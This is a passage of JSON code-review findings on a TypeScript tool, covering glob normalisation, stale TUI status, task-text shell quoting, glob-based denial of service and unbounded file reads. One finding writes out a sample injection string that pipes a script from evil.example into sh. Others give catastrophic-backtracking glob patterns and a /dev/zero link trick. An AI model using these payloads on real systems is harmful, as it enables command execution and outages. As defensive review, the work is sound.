    "reviewer": "review-logic",
    "dedupe_key": "single:review-logic-w3:F-003"
  },
  {
    "id": "review-logic-w4:F-001",
    "severity": "minor",
    "file": "src/gdskills/references-config.ts",
    "line": null,
    "quote": "items.push(item.trim());",
    "problem": "parseWhen/stringList keep each declared glob as the author typed it (trim only) and promotionReason in reference-entries.ts hands it unchanged to matchesAnyGlobWithBraces against task files that normaliseFiles has already put into project-relative posix form. The path field of the same entry goes through normaliseRelativePath (backslashes to slashes, './' removed, absolute and escaping paths rejected), but a glob gets no such treatment and no validation. Scratch run at head with matchesAnyGlobWithBraces: 'src/**/*.css' matches src/a.css; './src/**' does not match src/a.css; '/src/**/*.css' does not; the file 'src\\\\a.css' does not match 'src/**/*.css'; '!src/**' does not. Neither the loader nor `skills references check` (declarationFindings) reports a glob that cannot match.",
    "impact": "Path: an author writes \"globs\": [\"./src/**/*.css\"] (a natural spelling next to the tolerant path field) and has no keywords or a keyword the task text does not use. The file is validated, `references check` reports no finding for the entry, and `resolve-context --files src/a.css` never promotes it, so the mandatory read silently stays on_demand. The reference then looks installed and healthy while the feature the flow exists for (AC1 declarations, promotion by file) does not fire. It is a configuration mistake, hence minor; the cost is that the failure is silent.",
    "suggested_fix": "Normalise each glob in parseWhen the way normaliseRelativePath treats the path (convert backslashes, strip a leading './'), and reject a leading '/' or '!' with a message naming the entry, as the loader already does for an absolute path. Alternatively add a `references check` finding for a glob that starts with './', '/' or '!' or holds a backslash.",
    "evidence": "src/gdskills/references-config.ts:141-156 (stringList pushes item.trim()) and :167 (globs taken from it), versus :118-126 (normaliseRelativePath applied to path); src/gdskills/reference-entries.ts:58 (matchesAnyGlobWithBraces(file, [candidate]) with the raw declared glob); scratch script t1.ts glob cases.",
    "confidence": "high",
    "reviewer": "review-logic",
    "dedupe_key": "single:review-logic-w4:F-001",
    "location_class": "in-diff"
  },
  {
    "id": "review-logic-w6:F-001",
    "severity": "minor",
    "file": "src/tui/project-references-view.ts",
    "line": null,
    "quote": "if (budget.exceeded) lines.push(`  over the cap: ${budget.usedBytes} of ${budget.limitBytes} bytes`);",
    "problem": "A promoted reference row prints 'over the cap: <used> of <limit> bytes' whenever result.budget.exceeded is true. The resolver sets that flag in two ways: promoted bytes push the total over the limit (usedBytes > limitBytes, the sentence is true), or a plain rule or skill did not fit and fit() set exceeded = true without adding to used (context-resolver.ts: 'if (used + bytes > cap.limitBytes) { exceeded = true; return false; }'). In the second case usedBytes can be far below limitBytes. Repro: cap 131072, project rules of 100000 + 40000 bytes (the second goes on_demand, exceeded = true, used = 100000), a declared reference promoted by a glob with a 5000-byte section: budget = {usedBytes: 105000, limitBytes: 131072, exceeded: true}. Every promoted row then reads 'over the cap: 105000 of 131072 bytes', which is self-contradictory and blames the promotion for a cap overflow it did not cause. The R4 row of TUI-states.md says 'promoted rows show their bytes and over the cap: <used> of <limit> bytes' for the state 'Promoted and over the cap'; the implementation does not check that the promotion is what is over. (r02 review-testing-practices-w2:F-004 calls this fixture unreachable; the flag-without-overrun state is reachable, which is why the view needs the guard.)",
    "impact": "Wrong, misleading status text in the References tab for a project that overflows the cap through its ordinary rules and also has a promoted reference. The sidebar 'cap exceeded' marker is correct in that state; only the per-row sentence is wrong. No data is affected.",
    "suggested_fix": "Print the per-row sentence only when the total really is over the limit: `if (budget.usedBytes > budget.limitBytes) lines.push(...)`; when exceeded is true but usedBytes <= limitBytes, either omit it or say 'cap exceeded by other entries'. Add a render test with exceeded: true, usedBytes < limitBytes (the current R4 fixture, usedBytes 109 of 131072, would then assert the absence of the sentence, and a second fixture with usedBytes > limitBytes asserts it).",
    "evidence": "src/tui/project-references-view.ts at head, rowLines(): the line quoted. src/gdskills/context-resolver.ts resolveProjectContext: 'const fit = (bytes: number): boolean => { if (used + bytes > cap.limitBytes) { exceeded = true; return false; } used += bytes; return true; }' and 'budget: { limitBytes: cap.limitBytes, usedBytes: total, exceeded: exceeded || overCap, ... }' where total = used + references.promotedBytes. So exceeded is independent of total > limit.",
    "confidence": "high",
    "reviewer": "review-logic",
    "dedupe_key": "single:review-logic-w6:F-001"
  },
  {
    "id": "review-logic-w6:F-002",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "    applied = Math.max(applied, mine);\n    return next;",
    "problem": "reload() drops a result that started before an already-applied load (`mine > applied` false), but it still returns that dropped `next` to its caller. The two callers that act on the return value therefore can take an older status than the feed holds: showProjectContext passes it as `initial` to the modal, and the modal's `e` toggle does `.then(() => options.loadStatus()).then((next) => { status = next; ... })`. Interleaving: the operator clicks the sidebar (reload R, mine = 5, starts), a 5 s poll (mine = 6) starts after it, a resolve is recorded between their reads, poll finishes first and is applied (current = newer, applied = 6), R then finishes with the older status: it is not applied but is returned. The modal opens on the older status; because the modal subscribed after the poll's notification and the feed repaints nothing while the status is unchanged, it stays on the older status until the next change. The sidebar shows the newer status at the same time.",
    "impact": "Narrow window (one load wider than the other and a resolve recorded between them), but the outcome is a modal and sidebar that disagree and no later poll corrects it. In the toggle path the modal's `status.enforcement` can also be the pre-write value, so the next `e` press may write the wrong mode.",
    "suggested_fix": "Return what the feed holds, not what this load read: in reload(), after the `if`, `return mine > applied ? next : (current ?? next);` computed before `applied` is updated (or store `const fresh = mine > applied;` and return `fresh ? next : current ?? next`).",
    "evidence": "src/tui/project-context-inspector.ts createProjectContextFeed(), reload(): 'const mine = ++started; const next = await options.load(); if (mine > applied && !sameStatus(current, next)) { current = next; ... } applied = Math.max(applied, mine); return next;'. Callers: src/tui/tui-shell.ts showProjectContext ('.then((initial) => { openProjectContext(otui, chrome, { initial, ...') and the modal toggle in presentProjectContext ('.then(() => options.loadStatus()).then((next) => { status = next;'). The same function body with the stale-skip is covered by the tests only through the listener callbacks, not through the returned value.",
    "confidence": "medium",
    "reviewer": "review-logic",
    "dedupe_key": "feed-reload-returns-stale-status"
  },
  {
    "id": "review-logic-w8:F-001",
    "severity": "major",
    "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
    "line": null,
    "quote": "--task-text '<task.description>'",
    "problem": "The r02 shell-injection fix moves --task-text to single quotes, but only flow-orchestrator states the rule that makes that safe (a ' in the text becomes '\\''). task-implementer, job-orchestrator (2 sites), orchestrator-prompt (2 sites) and tests-creator give only the quoted placeholder. A description with an apostrophe (\"Don't touch the user's menu\") parses as one truncated argument plus stray arguments, or an unterminated quote.",
    "impact": "Keywords after the first apostrophe never reach the resolver, so the promotion the feature exists for is silently lost for such tasks; with an odd number of apostrophes the unquoted remainder reopens the $(...) execution path the change was meant to close.",
    "suggested_fix": "State the single-quote and '\\'' rule at every site, or point all sites at one statement of it, or pass the text through a file or stdin.",
    "evidence": "keryx ctx rg for \"'\\\\''\" over src/gdskills/bundled/skills and .metaproject/skills/gdskills/orchestration matches only the two flow-orchestrator files; keryx ctx rg --hidden \"task-text [\\\"']\" lists the other quoted sites; cmp confirmed the managed copies are identical to the bundled ones.",
    "confidence": "medium",
    "reviewer": "review-logic",
    "dedupe_key": "task-text-escape-rule-missing",
    "class_scope": {
      "sites": [
        "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
        ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:1307",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        ".metaproject/skills/gdskills/quality/tests-creator/SKILL.md:93",
        "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (already states the rule)"
      ],
      "enumeration_method": "keryx ctx rg --hidden for task-text followed by a quote character over README.md, docs, src, .metaproject/skills, .metaproject/core excluding reviews and flows (19 matches, 13 files); keryx ctx rg -c for the escape sequence '\\'' to find which sites state the rule (2 files, both flow-orchestrator). Literal examples in docs and live-run.md are fixed strings and are safe."
    },
    "blocking_merge": false
  },
  {
    "id": "review-logic-w8:F-002",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "applied = Math.max(applied, mine);",
    "problem": "In reload, applied is advanced after the subscriber loop. If a subscriber throws, applied is not advanced, and a slower older load then passes mine > applied and overwrites the newer status. A throwing subscriber also starves the listeners after it and is reported as a failed poll.",
    "impact": "Stale sidebar or tab until the next 5 s poll, only when a subscriber throws while loads overlap.",
    "suggested_fix": "Compute freshness and advance applied before notifying, and wrap each listener call in try/catch.",
    "evidence": "reload lines 172-182 at head; the R7 test (line 515) covers ordering with non-throwing subscribers only. Related earlier finding: review-clean-code-w5:F-003.",
    "confidence": "medium",
    "reviewer": "review-logic",
    "dedupe_key": "feed-applied-after-listeners",
    "blocking_merge": false
  },
  {
    "id": "review-logic-w8:F-003",
    "severity": "info",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "return cardSafe(parts.join(\" \u00b7 \"));",
    "problem": "The sidebar value is built only from a closed enforcement value, numbers and fixed phrases; no file text reaches it, so the new cardSafe call cleans nothing.",
    "impact": "None today; reads as protection that is not doing anything.",
    "suggested_fix": "Keep with a comment or drop; no action needed.",
    "evidence": "Negative enumeration of the strings pushed to parts at lines 99-105 and of referencesSidebarSegment in project-references-view.ts.",
    "confidence": "high",
    "reviewer": "review-logic",
    "dedupe_key": "sidebar-cardsafe-unpinned",
    "publication": "omit",
    "class_scope": {
      "sites": [
        "src/tui/project-context-inspector.ts:105"
      ],
      "enumeration_method": "read renderProjectContextSidebarValue and referencesSidebarSegment in full; the candidate strings are enforcement (closed set), rule count, refs counters, 'cap exceeded', 'config unreadable', none carrying file text."
    },
    "blocking_merge": false
  },
  {
    "id": "review-logic-w8:F-004",
    "severity": "info",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "if (polling) return;",
    "problem": "The polling latch clears only in finally. A load that never settles would stop all later polling for the session. No current path hangs; not reproduced.",
    "impact": "Only on a stalled filesystem; the sidebar and tab would stop following the project.",
    "suggested_fix": "Optional: time-box the latch or note the assumption in the comment.",
    "evidence": "poll lines 184-197 at head; loadProjectContextStatus is plain file reads.",
    "confidence": "low",
    "reviewer": "review-logic",
    "dedupe_key": "single:review-logic-w8:F-004",
    "publication": "question",
    "blocking_merge": false
  },
  {
    "id": "review-performance-w2:F-001",
    "severity": "info",
    "file": "src/gdskills/context-resolver.ts",
    "line": null,
    "quote": "taskTextLength: Array.from(options.taskText!).length",
    "problem": "recordLastResolve converts the whole task text to a code-point array to count it, after truncateTaskText has already done the same conversion on the same string (truncateTaskText calls Array.from(text) on the full input and then slices it). The resolver itself calls truncateTaskText once more on the same text. One resolve therefore materialises the full text as an array of code points three times, although only the first 4000 are ever used and only the length of the rest is wanted. The new line is the third conversion; the length could come from the first one.",
    "impact": "Negligible today: it runs once per resolve (not per request or per render), CLI arguments are capped by the OS (~128 KB) and the MCP/harness `task_text` is a task title and description. An unusually large task_text passed through the MCP tool would cost transient memory of about 8 bytes per code point per conversion before it is cut. No measurable effect at expected sizes, hence info.",
    "suggested_fix": "Have truncateTaskText also return the original length (`{ text, truncated, length }`, computing it from the same Array.from) and use `task.length` in recordLastResolve instead of a second Array.from; or count code points with a loop that does not allocate.",
    "evidence": "src/gdskills/context-resolver.ts: truncateTaskText does `const chars = Array.from(text)`; recordLastResolve calls truncateTaskText(options.taskText) and then `Array.from(options.taskText!).length`; resolveProjectContext calls `truncateTaskText(input.taskText ?? \"\")`. Hot path: once per `resolve-context` invocation (per task dispatch), not per poll or per render.",
    "confidence": "high",
    "reviewer": "review-performance",
    "dedupe_key": "task-text-length-recompute",
    "location_class": "in-diff"
  },
  {
    "id": "review-security-code-w1:F-101",
    "severity": "minor",
    "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
    "line": null,
    "quote": "--task-text '<task.description>' --out <project-relative path>",
    "problem": "The r02 shell-injection finding (w4:F-002) is fixed in quote style at all seven bundled sites and their managed copies (double quotes became single quotes), but only flow-orchestrator/SKILL.md also tells the dispatcher how to write a `'` inside the text (`'\\''`). task-implementer/SKILL.md, tests-creator/SKILL.md, job-orchestrator/SKILL.md (two sites) and orchestrator-prompt.md (two sites) show `'<...>'` with no escape rule. Task descriptions routinely contain apostrophes. An input path for text longer than the argv limit (a file or stdin form) is also still absent.",
    "impact": "Trigger: a task description with two or more apostrophes and a backtick span or `$(...)` between them, for example: Fix the user's `config` loader, it's broken. An agent that copies the placeholder literally closes the single quote at the first apostrophe, and the shell then runs the backticked span as a command in the dispatcher's shell. Outcome: unintended command execution from issue or plan text; with an odd number of apostrophes the command fails with an unterminated-quote error and the resolve is lost. The residual is narrower than r02's: flow-orchestrator is covered, and a dispatching agent often escapes unprompted.",
    "suggested_fix": "Carry the sentence flow-orchestrator now has (\"Write the text single-quoted (a `'` inside it becomes `'\\''`)\") into the other four skills, in the bundled and the managed copies, or add `--task-text-file <path>` / `--task-text -` and have the skills write the description to a file with a quoted heredoc. skill-sync.test.ts already keeps the two copies identical.",
    "evidence": "Read at head: flow-orchestrator/SKILL.md:323 contains the escape sentence; a text search of the other four bundled files and their .metaproject/skills/gdskills copies for --task-text shows only the single-quoted placeholder (task-implementer:182, tests-creator:93, job-orchestrator:749 and 1307, orchestrator-prompt:132 and 188). docs/docs/guides/apply-project-rules.md:172 and live-run.md still use double quotes, but with fixed example strings an operator types by hand.",
    "confidence": "medium",
    "reviewer": "review-security-code",
    "dedupe_key": "task-text-escape-rule-missing",
    "class_scope": {
      "sites": [
        "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
        "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (correct, carries the escape rule)",
        "the same lines in the managed copies under .metaproject/skills/gdskills/"
      ],
      "enumeration_method": "Text search for --task-text over the five bundled skill files, their managed copies, README.md and docs/ at head; only flow-orchestrator names the apostrophe rule."
    }
  },
  {
    "id": "review-security-code-w1:F-102",
    "severity": "minor",
    "file": "src/gdskills/references-check.ts",
    "line": null,
    "quote": ".filter((entry) => entry.mode === \"link\" && !copies.includes(entry.ref))",
    "problem": "The linked-rule fix reads each `--link` rule at its origin but does not compare the file with the registered sha256. The resolver's collectProjectRules (context-resolver.ts) excludes a linked rule whose origin changed since it was linked, with the warning 'changed since it was linked; the rule is excluded. Review it, then run keryx skills update --rules'. scanCitations takes the citations of such a changed, unreviewed file at face value.",
    "impact": "The authoring checker and the engine disagree again, in the opposite direction: after a linked file is edited outside the project, `references check` counts a declaration as used and `references suggest` and the import hint propose documents on the strength of text the resolver refuses to apply. The effect is advisory (nothing is written, and every suggested path is still checked to resolve inside the project root), so the harm is a misleading report, not a bypass.",
    "suggested_fix": "Compare sha256Hex(text) with entry.sha256 for link entries and report a mismatch like an unreadable rule (unreadableRules), or share collectProjectRules' read-and-verify step between the two scanners.",
    "evidence": "Read references-check.ts:94-119 and context-resolver.ts:205-230 at head: the resolver has the sha256 gate at lines 223-226; scanCitations imports only PROJECT_RULES_DIR and readProjectRuleRegistry and has no hash comparison. The new test in skills-references.test.ts registers links with a matching sha256 only.",
    "confidence": "medium",
    "reviewer": "review-security-code",
    "dedupe_key": "scancitations-linked-rule-parity"
  },
  {
    "id": "review-security-code-w3:F-001",
    "severity": "info",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "only: a rule imported with `--link` is not scanned, and neither are bundled",
    "problem": "The guide and docs/docs/cli-reference.md (`a linked rule is not scanned`) tell the operator that `skills references check` skips rules imported with --link. At head src/gdskills/references-check.ts builds a `links` map from the registry entries whose mode is link and scans them at their origin. An operator who reads the docs believes a linked rule outside the project cannot influence the report; in fact its content is read and its backticked X.md names are reported.",
    "impact": "Documentation drift on a trust boundary, not an exploit: no attack vector in the changed code (the report only prints names and warnings, and the origin is one the operator imported). Info only, per the rubric. It matters because the same linked-rule scan is the one that lacks the sha256 gate (w1:F-102), so the doc currently hides that a linked origin file is read at all.",
    "suggested_fix": "Change both sentences to say that a linked rule is scanned at its origin and that a bundled rule is not; or, if linked rules are meant to be skipped, remove the `links` branch in scanCitations.",
    "evidence": "docs/docs/guides/apply-project-rules.md:261 `only: a rule imported with `--link` is not scanned, and neither are bundled`; docs/docs/cli-reference.md:3491 `a linked rule is not scanned.`; src/gdskills/references-check.ts:99 `const links = new Map((await readProjectRuleRegistry(projectRoot)).filter((entry) => entry.mode === \"link\" && !copies.includes(entry.ref))`.",
    "confidence": "high",
    "reviewer": "review-security-code",
    "dedupe_key": "docs-linked-rule-not-scanned",
    "location_class": "in-diff",
    "publication": "finding"
  },
  {
    "id": "review-security-code-w4:F-001",
    "severity": "minor",
    "file": "src/lib/glob.ts",
    "line": null,
    "quote": "for (const expanded of expandBraces(`${head}${alternative}${tail}`)) out.push(expanded);",
    "problem": "The new `when.globs` of .metaproject/rules/project/references.json are matched in promotionReason (reference-entries.ts) through matchesAnyGlobWithBraces. expandBraces multiplies the alternatives of every brace group (n groups of two give 2^n globs), and globToRegExp turns each `*` into `[^/]*` and each `**` into `.*`, so a glob with several of them backtracks polynomially against a path. parseReferences (references-config.ts) accepts any non-empty glob string: no limit on length, on the number of globs or entries, or on brace groups. The matching code is shared with rule frontmatter globs, but references.json is a new, equally repo-controlled input to the same code on every `skills resolve-context`.",
    "impact": "Trigger: references.json (committed to the repo, or changed in a PR) contains a glob such as `{a,b}{a,b}...{a,b}x` (about 40 groups, 200 bytes) or `**a**a**a**a**a**a**a**a**a**a**b`, and anyone or any agent runs `keryx skills resolve-context --files <any file>` on that checkout (the orchestrator does it before every implement, test and review dispatch). Outcome: the process pins a CPU and grows memory without end; the resolve never returns, so the dispatch and the flow stall. Measured here at head with bun: `{a,b}` x 18 + `x` took 1150 ms (doubling per group), and `**a` x 10 + `b` against `src/` + 60 `a` + `.css` did not finish within 100 s. Preconditions: write access to the rules folder of the project being resolved, which is the same trust level as the rest of the rules, so this is a local availability problem, not a privilege boundary; it matters most where a tool resolves a contributor's checkout.",
    "suggested_fix": "Bound the input where it enters: in references-config.ts reject a glob longer than a fixed limit (for example 256 characters), more than a few brace groups, and more than a few `*` / `**` segments, and cap entries per file; in expandBraces stop at a fixed number of expansions (for example 64) and report the glob as too broad. Cap the same way in the frontmatter glob path so the two stay one rule. Add a test that a 40-group brace glob is rejected by `parseReferences` in under a second.",
    "evidence": "Probe run read-only in the scratchpad against src/lib/glob.ts at head: braces18 = 1150 ms; starstar10 killed by the 100 s timeout. src/gdskills/references-config.ts stringList() checks only that each item is a non-empty string; reference-entries.ts promotionReason() calls `matchesAnyGlobWithBraces(file, [candidate])` for every task file.",
    "confidence": "high",
    "reviewer": "review-security-code",
    "dedupe_key": "glob-pattern-unbounded"
  },
  {
    "id": "review-security-code-w4:F-002",
    "severity": "info",
    "file": "src/gdskills/resolved-context-check.ts",
    "line": null,
    "quote": "if (isPromoted(entry)) misses.push(...(await proofMisses(input.projectRoot, entry, items)));",
    "problem": "Whether an entry owes the proof is read from the resolved JSON itself (`tier === \"must_read\"` and `reason` starting with `condition:`). checkResolvedContext does not re-run the resolver against references.json and the task files, and the task text is deliberately not kept (last.json stores a length only), so nothing can recompute which references the task should have promoted. `flow task done` also skips the whole check when `--result` and `--resolved` are both omitted and enforcement is not `block`.",
    "impact": "No attack vector in the changed code: the resolved file is written by the dispatching side, the same trust as flow 461's hash pin, which this change inherits. It is recorded because the new obligation is the first one that depends on a keyword in the task text, which cannot be audited afterwards: a resolved file whose `reason` was edited from `condition:keyword:x` to `declared`, and tier to `on_demand`, passes with no proof and no miss. Info only; what would settle it is whether the orchestrator or the worker can write the resolved file the validator is given.",
    "suggested_fix": "If the resolved file can be written by the worker, have `flow task done` re-resolve with the glob-only part of each condition (the task files are known) and compare tiers, and keep the keyword case advisory. Otherwise state in docs/requirements/keryx-conditional-reads/README.md that the proof is only as strong as the integrity of resolved/*.json.",
    "evidence": "src/gdskills/resolved-context-check.ts checkResolvedContext() loops over `input.resolved.entries` and trusts `entry.tier` and `entry.reason`; src/flow/task-project-context.ts:40-49 returns early without a check when no result and resolved file is given and enforcement is not block; src/gdskills/context-resolver.ts recordLastResolve keeps taskTextLength only.",
    "confidence": "low",
    "reviewer": "review-security-code",
    "dedupe_key": "single:review-security-code-w4:F-002",
    "publication": "question"
  },
  {
    "id": "review-security-code-w5:F-001",
    "severity": "major",
    "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
    "line": null,
    "quote": "--task-text '<task.description>' --out <project-relative path>",
    "problem": "Commit 4838b1b40 changed the --task-text examples from double to single quotes and wrote the rule that an embedded ' becomes '\\'' only in flow-orchestrator/SKILL.md:323. Four other instruction sites (task-implementer, tests-creator, job-orchestrator SKILL.md twice, orchestrator-prompt.md twice) show --task-text '<...>' with no escape rule, so text that holds an apostrophe closes the quote and the remainder is parsed by the shell.",
    "impact": "Task text comes from issues and PR descriptions that outsiders can write. An issue body such as x'; curl https://evil.example/p.sh | sh; echo ' substituted literally by the executing agent runs in its Bash shell with the checkout and its credentials. Plain apostrophes break the command without any attacker. Exploitation needs the model to copy the text verbatim, hence major and not blocker.",
    "suggested_fix": "Put the same sentence as flow-orchestrator:323 at every site, or better remove the shell from the path: write the text to a workspace file and pass --task-text-file, or read it from stdin. Add a contract test over bundled skill files that fails on a --task-text ' example without the escape rule.",
    "evidence": "keryx ctx rg -n --all \"task-text\" src/gdskills/bundled/skills lists 7 matches in 5 files; keryx ctx rg -n --all -e \"single-quoted\" -e \"inside it becomes\" shows the escape rule only at flow-orchestrator/SKILL.md:323. task-implementer/SKILL.md:182 reads: ... --task-text '<task.description>' --out <project-relative path> ...; no escape mention anywhere in that file. The managed copies under .metaproject/skills/gdskills are byte-identical (diff -q on task-implementer).",
    "confidence": "high",
    "reviewer": "review-security-code",
    "dedupe_key": "task-text-escape-rule-missing",
    "location_class": "in-diff",
    "class_scope": {
      "sites": [
        "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
        "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182",
        ".metaproject/skills/gdskills/quality/tests-creator/SKILL.md:93",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:1307",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (correct: carries the escape rule)"
      ],
      "enumeration_method": "keryx ctx rg -n --all \"task-text\" src/gdskills/bundled/skills (7 matches, 5 files) plus keryx ctx rg -n --all -e \"single-quoted\" -e \"inside it becomes\" src/gdskills/bundled/skills (escape rule at flow-orchestrator:323 only); .metaproject copies are byte-identical per the skill-sync test"
    },
    "blocking_merge": false
  },
  {
    "id": "review-security-code-w5:F-002",
    "severity": "minor",
    "file": "src/gdskills/reference-entries.ts",
    "line": null,
    "quote": "const glob = declaration.when.globs.find((candidate) => files.some((file) => matchesAnyGlobWithBraces(file, [candidate])));",
    "problem": "Globs from references.json are validated only as non-empty strings, then passed to matchesAnyGlobWithBraces. globToRegExp turns every ** into .* (polynomial backtracking with several of them) and expandBraces expands {a,b} groups recursively into 2^n globs, each compiled to a regex.",
    "impact": "A references.json in a proposed change with seven chained ** or a dozen {a,b} groups stalls or exhausts memory when a maintainer or CI runs resolve-context or references check on the branch. Denial of service only, needs write access to a change, so defence in depth.",
    "suggested_fix": "In parseWhen cap globs per entry, glob length, count of ** and count of {; in globToRegExp collapse consecutive ** into one .*.",
    "evidence": "src/lib/glob.ts: 'source += \".*\";' for each **, and expandBraces recurses over every alternative; references-config.ts parseWhen/stringList check only typeof string and non-empty.",
    "confidence": "medium",
    "reviewer": "review-security-code",
    "dedupe_key": "glob-pattern-unbounded",
    "location_class": "in-diff",
    "blocking_merge": false
  },
  {
    "id": "review-security-code-w6:F-001",
    "severity": "major",
    "file": "src/gdskills/references-check.ts",
    "line": null,
    "quote": "text = await readFile(origin === undefined ? path.join(projectRoot, rulePath) : resolveOriginPath(origin, projectRoot), \"utf8\");",
    "problem": "scanCitations reads the origin of every link-mode project rule with a bare readFile: no lstat/stat, no isFile check, no size cap, no check that the path is inside the project. The origin is the `origin` string of a projectRuleRegistry entry in .metaproject/metaproject.json (readProjectRuleRegistry only checks kind, ref, mode and sha256 are present), and resolveOriginPath returns any absolute path or ~/ path verbatim. This slice makes the read unattended: tui-shell.ts creates createProjectContextFeed({ load: () => loadProjectContextStatus(projectContextDir()) }) at shell start and the feed polls it every PROJECT_CONTEXT_POLL_MS (5000 ms); loadProjectContextStatus -> readReferences -> checkReferences -> scanCitations runs whenever .metaproject/rules/project/references.json exists. The sibling reader in the same file, inspectDocument, does the right thing (lstat, realpath, isPathInside, stat().isFile(), size <= CONTRACT_MAX_BYTES) for the declared documents, so the guarded pattern exists one function below. The resolver's readText (context-resolver.ts:177) has the same bare readFile and also runs on the link origin, but it is only reached when an agent runs resolve-context; before this flow nothing read a link origin merely because the TUI was open.",
    "impact": "Attack vector: an attacker publishes a repository whose tracked .metaproject/metaproject.json registers a link-mode rule with origin \"/dev/zero\" (and no copy under .metaproject/rules/project/, so the link branch is taken) next to a valid references.json. The victim clones it and opens keryx in that directory. Within the first tick, and every 5 s after, scanCitations calls readFile(\"/dev/zero\"). Probed: under `ulimit -v 6000000`, bun -e 'readFile(\"/dev/zero\",\"utf8\")' fails with ENOMEM after about 0.9 s, so the read buffers until the allocator refuses; I did not run it without a limit, where the process can be killed by the OOM killer instead. With origin \"/dev/stdin\" or \"/dev/tty\" (or any FIFO the attacker can name on the victim's machine) readFile blocks instead: the poll guard then keeps later polls from piling up, but every showProjectContext()/`/projectctx` awaits a fresh loadProjectContextStatus that never resolves, each pinning another libuv thread-pool thread, and a tty origin competes with the TUI for keystrokes (not probed). Outcome is availability of the operator's TUI session (memory exhaustion or a frozen /projectctx and enforcement toggle), triggered by opening an untrusted checkout. No data is disclosed: only backticked *.md tokens that name existing files are echoed back.",
    "suggested_fix": "Read the origin through one bounded helper and use it in scanCitations (and, while there, the resolver's readText): lstat/stat the resolved path, require isFile(), require size <= CONTRACT_MAX_BYTES, then readFile; treat anything else as `unreadable` so the rule lands in unreadableRules and produces the existing `rule-unreadable` warning. Optionally skip a linked rule whose sha256 no longer equals entry.sha256, as collectProjectRules does, so the check never scans text the operator has not reviewed. Add a test with a link origin pointing at a directory, a FIFO and a file over the cap: checkReferences must return `rule-unreadable` without reading it.",
    "evidence": "src/gdskills/references-check.ts:99-109 (links map built from readProjectRuleRegistry, then readFile(resolveOriginPath(origin, projectRoot))); src/gdskills/project-skills.ts:309-315 resolveOriginPath returns path.resolve(projectRoot, ref) so an absolute ref is unchanged; src/gdskills/project-rules.ts:51-68 isEntry/readProjectRuleRegistry do not validate `origin`; src/gdskills/project-context-status.ts:74-80 readReferences calls checkReferences; slice-08 tui-shell.ts hunk @@ 5252,5294 @@ createProjectContextFeed + PROJECT_CONTEXT_POLL_MS in project-context-inspector.ts; .metaproject/metaproject.json is PROJECT_SKILLS_MANIFEST_PATH (tracked). Probe: bun readFile(\"/dev/zero\") under ulimit -v -> ENOMEM in 920 ms.",
    "confidence": "medium",
    "reviewer": "review-security-code",
    "dedupe_key": "single:review-security-code-w6:F-001",
    "class_scope": {
      "sites": [
        "src/gdskills/references-check.ts:105 (scanCitations, new in this PR, reached by the TUI poll)",
        "src/gdskills/context-resolver.ts:177-183 and :217-218 (readText on the link origin, reached by resolve-context; existing)",
        "src/review/reviewers.ts:271 (readFile(resolveOriginPath(origin, projectRoot)); existing, not reached from this slice)",
        "src/gdskills/update-rules.ts:69 (originPath for an explicit `skills update --rules`; existing, operator-invoked)",
        "src/gdskills/references-check.ts:121-143 inspectDocument (already guarded; the model for the fix)"
      ],
      "enumeration_method": "keryx ctx rg --all resolveOriginPath src (15 matches in 7 files); read each caller. Only references-check.ts:105 is both new in this PR and reachable unattended from the TUI poll; the others are listed so the fix can share one helper."
    }
  },
  {
    "id": "review-security-code-w6:F-002",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "body.add(new Ctor(renderer, { id: `projectctx-${tab}`, content: stylePlanText(otui, lines.map(cardSafe).join(\"\\n\"), \"plain\") }));",
